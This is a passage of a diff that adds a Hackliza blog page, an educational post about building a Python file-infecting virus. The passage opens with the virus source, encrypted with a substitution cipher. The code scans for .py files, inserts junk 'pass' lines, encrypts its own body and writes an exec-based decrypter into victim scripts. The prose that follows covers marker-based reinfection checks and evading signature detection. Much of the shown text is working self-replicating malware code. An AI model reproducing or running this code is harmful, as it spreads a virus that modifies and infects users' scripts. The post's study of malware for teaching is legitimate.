+</span><span style="color:#e6db74">    ebgxl = vhwx.liebm(vak(10))
+</span><span style="color:#e6db74">    yhk b bg ktgzx(10):
+</span><span style="color:#e6db74">        by ktgwhf.ktgwhf() &gt; 0.75:
+</span><span style="color:#e6db74">            bglxkmbhg_ihlbmbhg = ktgwhf.ktgwbgm(1, exg(ebgxl) - 1)
+</span><span style="color:#e6db74">            ebgxl.bglxkm(bglxkmbhg_ihlbmbhg, &#34; &#34; * vtevnetmx_mtunetmbhg(ebgxl, bglxkmbhg_ihlbmbhg) + &#34;itll&#34;)
+</span><span style="color:#e6db74">    kxmnkg vak(10).chbg(ebgxl)
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">wxy fhwbyr(vhwx):
+</span><span style="color:#e6db74">    gxp_vhwx = []
+</span><span style="color:#e6db74">    lxitktmhk = vak(10) + vak(10) + vak(10)
+</span><span style="color:#e6db74">    yngvmbhgl = vhwx.liebm(lxitktmhk)
+</span><span style="color:#e6db74">    yhk mxqm bg yngvmbhgl:
+</span><span style="color:#e6db74">        by mxqm:
+</span><span style="color:#e6db74">            vhwx_pbmahnm_itll = wxexmx_itll(mxqm)
+</span><span style="color:#e6db74">            vhwx_pbma_itll = tww_itll(vhwx_pbmahnm_itll)
+</span><span style="color:#e6db74">            gxp_vhwx.tiixgw(vhwx_pbma_itll)
+</span><span style="color:#e6db74">        xelx:
+</span><span style="color:#e6db74">            gxp_vhwx.tiixgw(mxqm)
+</span><span style="color:#e6db74">    kxmnkg lxitktmhk.chbg(gxp_vhwx)
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">wxy bgyxvm(obknl):
+</span><span style="color:#e6db74">    bfihkm hl
+</span><span style="color:#e6db74">    yhk ybex bg hl.eblmwbk(&#34;.&#34;):
+</span><span style="color:#e6db74">        by ybex.xgwlpbma(&#34;.ir&#34;):
+</span><span style="color:#e6db74">            lvkbim = hixg(ybex, &#34;k+&#34;)
+</span><span style="color:#e6db74">            mxqm_lvkbim = lvkbim.kxtw()
+</span><span style="color:#e6db74">            by &#34;wxy vtevnetmx_dxr&#34; ghm bg mxqm_lvkbim:
+</span><span style="color:#e6db74">                ietbg_itkm = obknl[:obknl.ybgw(&#34;wxy xgvkrim&#34;)]
+</span><span style="color:#e6db74">                itkm_mh_xgvkrim = obknl[obknl.ybgw(&#34;wxy xgvkrim&#34;):]
+</span><span style="color:#e6db74">                fhwbybxw_ietbg_itkm = fhwbyr(ietbg_itkm)
+</span><span style="color:#e6db74">                dxr = vtevnetmx_dxr(mxqm_lvkbim)
+</span><span style="color:#e6db74">                xgvkrimxw_itkm = xgvkrim(itkm_mh_xgvkrim, dxr)
+</span><span style="color:#e6db74">                lvkbim.pkbmx(fhwbybxw_ietbg_itkm)
+</span><span style="color:#e6db74">                wxvkrimxk = &#34;bfihkm lrl&#34; + vak(10) + &#34;ahlm = hixg(lrl.tkzo[0], &#34; + vak(34) + &#34;k&#34; + vak(34) + &#34;)&#34; + vak(10) + &#34;ahlm_mxqm = ahlm.kxtw()&#34; + vak(10) + &#34;ahlm.vehlx()&#34; + vak(10) + &#34;ietbg_itkm = ahlm_mxqm[ahlm_mxqm.ybgw(&#34; + vak(34) + &#34;wxy vtevnetmx_dxr&#34; + vak(34) + &#34;):ahlm_mxqm.ybgw(&#34; + vak(34) + &#34;wxy vtevnetmx_dxr&#34; + vak(34) + &#34;)+&#34; + lmk(exg(fhwbybxw_ietbg_itkm)) + &#34;]&#34; + vak(10) + &#34;dxr = vtevnetmx_dxr(ahlm_mxqm)&#34; + vak(10) + &#34;wxvkrimxw_mxqm = wxvkrim(&#34; + vak(34) + vak(34) + vak(34) + xgvkrimxw_itkm + vak(34) + vak(34) + vak(34) + &#34;, dxr)&#34; + vak(10) + &#34;xqxv(wxvkrimxw_mxqm)&#34; + vak(10) + &#34;kng(ietbg_itkm + wxvkrimxw_mxqm)&#34;
+</span><span style="color:#e6db74">                lvkbim.pkbmx(wxvkrimxk)
+</span><span style="color:#e6db74">            lvkbim.vehlx()
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">wxy itrehtw():
+</span><span style="color:#e6db74">    ikbgm(&#34;Rhn pxkx bgyxvmxw&#34;)
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">wxy kng(obknl):
+</span><span style="color:#e6db74">    bgyxvm(obknl)
+</span><span style="color:#e6db74">    itrehtw()&#34;&#34;&#34;</span>, key)
+<span style="color:#66d9ef">exec</span>(decrypted_text)
+run(plain_part <span style="color:#f92672">+</span> decrypted_text)
+</code></pre></div><p>Finally, remember that this variant of the virus, like the previous one, infects files that do not contain the string 
+&ldquo;def calcula_clave&rdquo;, so if a string exists in a legitimate program or script, it will not be infected.</p>
+<h1 id="to-keep-in-mind">To keep in mind</h1>
+<h2 id="file-discrimination">File discrimination</h2>
+<p>In the last two variants of the virus, it happens that when seeing if a file is previously infected, it is checked if 
+it contains the string &ldquo;def calcula_clave&rdquo;. When a virus uses a way to detect itself, it allows analysts to know this 
+same information, so they will know how to detect whether a file may be infected or not.</p>
+<p>On the other hand, if the virus does not have this mechanism, you may have problems with overinfection. This is because 
+the virus can infect the same file multiple times. Overinfection of one or more files results in the user perceiving a 
+worse performance when running a program (after all, if you run an infected program several times, it will take time to 
+perform the legitimate functionality as the code will also run of various infections), along with a loss of space in 
+secondary memory. This lack of performance and space will make the user think that something is wrong, causing him to 
+repair the computer and therefore stop the infection.</p>
+<p>The way in which the virus will detect whether a file is infected or not is very important when creating it, as it will 
+determine its own virulence, so whenever a virus develops this issue must be kept in mind.</p>
+<h2 id="protections-used">Protections used</h2>
+<p>The protections used (code encryption and “pass” insertion) are aimed at evading signature detection. If a detection 
+technique is applied using a heuristic analysis or behavioral analysis you will end up discovering that this program is 
+a virus.</p>
+<p>It should be clarified that when a code is obscured in a compiled language, assembler instructions will be encrypted, 
+so the implementation of this technique will be far from what is proposed here.</p>
+<h2 id="language">Language</h2>
+<p>Viruses (or any type of malware) are usually built in compiled languages to avoid external dependencies. Using Python 
+reduces the ability to infect of the created viruses, as it will only be effective on computers that have the language 
+installed and with the correct version.</p>
+<h1 id="conclusions">Conclusions</h1>
+<p>This publication has seen how a virus works along with some of its defense mechanisms, and this whole process is more 
+complex than explained, as in this field there are many more forms of infection and protection.</p>
+<p>Maybe in the future other topics will be addressed in Hackliza such as the creation of a worm, the operation of a 
+cavity or a rookit, but for now we will have to wait.</p>
+<h1 id="references">References</h1>
+<p>Filiol, E. (2004). <em>Computer viruses: from theory to application</em> (1st ed.). Springer</p>
+<p>Szor, P. (2005). <em>The Art of Computer Virus Researchand Defense</em> (1st ed.). Addison Wesley Professional</p>
+<p><a href="https://www.youtube.com/watch?v=2Ra1CCG8Guo">Writing Viruses for Fun, not Profit</a></p>
+<p><a href="https://www.emis.de/journals/IJOPCM/files/IJOPCM(vol.1.2.3.S.8).pdf">Computer Virus Strategies and Detection Methods</a></p>
+<p><a href="https://0xpat.github.io/Malware_development_part_1/">Malware development part 1</a></p>
+
+
+        
+          <div class="blog-tags">
+            
+              <a href="https://hackliza.gal/en/tags/python/">python</a>&nbsp;
+            
+              <a href="https://hackliza.gal/en/tags/malware/">malware</a>&nbsp;
+            
+              <a href="https://hackliza.gal/en/tags/obfuscation/">obfuscation</a>&nbsp;
+            
+          </div>
+        
+
+        
+
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://hackliza.gal/en/posts/r2heap/" data-toggle="tooltip" data-placement="top" title="Heap analysis with radare2">&larr; Previous Post</a>
+            </li>
+          
+          
+            <li class="next">
+              <a href="https://hackliza.gal/en/posts/console_usability/" data-toggle="tooltip" data-placement="top" title="Tricks to improve console programs usability">Next Post &rarr;</a>
+            </li>
+          
+        </ul>
+      
+
+
+      
+        
+          
+          <div class="disqus-comments">
+            <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hackliza" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+          </div>
+          
+        
+        
+      
+
+    </div>
+  </div>
+</div>
+
+      
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+              <li>
+                <a href="https://github.com/hackliza" title="GitHub">
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://twitter.com/hackliza" title="Twitter">
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+          
+          <li>
+            <a href="" title="RSS">
+              <span class="fa-stack fa-lg">
+                <i class="fas fa-circle fa-stack-2x"></i>
+                <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+              </span>
+            </a>
+          </li>
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            2024
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://hackliza.gal/en/">Hackliza</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="https://gohugo.io">Hugo v0.74.3</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"></script>
+<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+<script src="https://hackliza.gal/js/main.js"></script><script> renderMathInElement(document.body); </script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://hackliza.gal/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+
+
+    
+  </body>
+</html>
+
